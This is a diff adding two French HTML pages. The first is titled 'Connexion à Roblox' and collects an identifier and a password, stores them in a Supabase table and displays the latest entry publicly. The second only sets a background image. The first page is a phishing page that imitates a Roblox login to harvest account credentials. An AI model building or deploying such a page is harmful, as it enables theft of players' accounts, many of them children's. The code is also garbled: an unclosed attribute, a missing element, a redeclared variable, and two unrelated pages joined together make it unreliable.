@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à Roblox</title>
+    
+    <!-- Chargement de la bibliothèque Supabase -->
+    <script src="https://jsdelivr.net"></script>
+
+    <style>
+        body {
+            margin: 0;
+            padding-top: 100px; /* Augmenté pour laisser de la place au bandeau à 2 lignes */
+            background-color: #121212;
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        /* 1. Le bandeau blanc tout en haut de l'écran */
+        #bandeau-blanc {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 80px; /* Légèrement plus grand pour afficher le pseudo Roblox en dessous */
+            background-color: #ffffff;
+            color: #000000;
+            display: flex;
+            flex-direction: column; /* Aligne le message et le pseudo l'un sous l'autre */
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            z-index: 9999;
+            padding: 0 20px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        #texte-principal {
+            font-weight: bold;
+            font-size: 18px;
+            margin: 0;
+        }
+
+        #pseudo-roblox-affichage {
+            font-size: 14px;
+            color: #0074e4; /* Couleur bleue style Roblox */
+            font-weight: 600;
+            margin-top: 4px;
+        }
+
+        /* 2. Le formulaire */
+        .conteneur-formulaire {
+            max-width: 500px;
+            margin: 40px auto;
+            padding: 20px;
+            background-color: #1e1e1e;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        input[type="text"] {
+            width: 85%;
+            padding: 10px;
+            border: 1px solid #444;
+            border-radius: 4px;
+            background-color: #333;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 12px;
+            box-sizing: border-box;
+        }
+
+        /* Style spécifique pour la case Roblox */
+        #champ-roblox {
+            border-left: 4px solid #0074e4; 
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 85%;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Le bandeau blanc qui affiche le message mondial et le pseudo Roblox -->
+    <div id="bandeau-blanc">
+        <p id="texte-principal">Connexion à Roblox...</p>
+        <div id="identifiantdiv>
+    </div>
+
+    <!-- Le formulaire pour envoyer les informations -->
+    <div class="conteneur-formulaire">
+        <h3>Connexion</h3>
+        
+        <!-- Case 1 : Le message -->
+        <input type="text" id="champ-message" placeholder="identifiant..." maxlength="100">
+        
+        <!-- Case 2 : Le pseudo Roblox (Optionnel) -->
+        <input type="text" id="champ-roblox" placeholder="Mot de passe..." maxlength="30">
+        
+        <br>
+        <button id="bouton-envoyer">Connexion</button>
+    </div>
+
+    <script>
+        // CONFIGURATION DE LA BASE DE DONNÉES SUPABASE
+        const SUPABASE_URL = "https://VOTRE_PROJET.supabase.co";
+        const SUPABASE_ANON_KEY = "VOTRE_CLE_ANONYME";
+
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        const textePrincipal = document.getElementById('texte-principal');
+        const robloxAffichage = document.getElementById('pseudo-roblox-affichage');
+        const champMessage = document.getElementById('champ-message');
+        const champRoblox = document.getElementById('champ-roblox');
+        const boutonEnvoyer = document.getElementById('bouton-envoyer');
+
+        // 1. Fonction pour récupérer les dernières données
+        async function chargerDernierMessage() {
+            const { data, error } = await supabase
+                .from('messages_bandeau')
+                .select('texte, roblox')
+                .order('created_at', { ascending: false })
+                .limit(1);
+
+            if (error) {
+                console.error(error);
+                textePrincipal.innerText = "Impossible de charger le Mot de passe.";
+                robloxAffichage.innerText = "";
+            } else if (data && data.length > 0) {
+                // Affiche le message principal
+                textePrincipal.innerText = data[0].texte;
+                
+                // Affiche le pseudo Roblox si la colonne n'est pas vide
+                if (data[0].roblox && data[0].roblox.trim() !== "") {
+                    robloxAffichage.innerText = "🎮 Ajoute-moi sur Roblox : " + data[0].roblox;
+                } else {
+                    robloxAffichage.innerText = ""; // On efface s'il n'y en a pas
+                }
+            } else {
+                textePrincipal.innerText = "Aucun message pour le moment !";
+                robloxAffichage.innerText = "";
+            }
+        }
+
+        // 2. Fonction pour envoyer le message et le pseudo
+        async function envoyerMessage() {
+            const texteMessage = champMessage.value.trim();
+            const pseudoRoblox = champRoblox.value.trim();
+            
+            if (!texteMessage) {
+                alert("Le message principal ne peut pas être vide !");
+                return;
+            }
+
+            boutonEnvoyer.disabled = true;
+            boutonEnvoyer.innerText = "Envoi...";
+
+            // On envoie le texte ET le pseudo Roblox à Supabase
+            const { error } = await supabase
+                .from('messages_bandeau')
+                .insert([{ 
+                    texte: texteMessage, 
+                    roblox: pseudoRoblox 
+                }]);
+
+            if (error) {
+                alert("Erreur lors de l'envoi : " + error.message);
+            } else {
+                champMessage.value = ""; 
+                champRoblox.value = ""; 
+                chargerDernierMessage(); 
+            }
+            boutonEnvoyer.disabled = false;
+            boutonEnvoyer.innerText = "Mettre à jour le bandeau";
+        }
+
+        boutonEnvoyer.addEventListener('click', envoyerMessage);
+        
+        // Charger au démarrage
+        chargerDernierMessage();
+
+        // Actualiser toutes les 10 secondes pour tout le monde
+        setInterval(chargerDernierMessage, 10000);
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Mon Site</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background-repeat: no-repeat;
+      background-position: center;
+      background-attachment: fixed;
+      background-size: cover;
+    }
+  </style>
+</head>
+<body>
+
+  <script>
+    // Mets ton lien d'image Roblox ici
+    const lienImage = "https://image.api.playstation.com/vulcan/ap/rnd/202604/0801/6157a74f216f5fd380f33d326132130e6d1d7578291da74c.png";
+
+    // On met l'image en fond
+    document.body.style.backgroundImage = `url('${lienImage}')`;
+
+    // Si l'image est bloquée, on ne fait rien
+    const img = new Image();
+    img.src = lienImage;
+  </script>
+</body>
+</html>
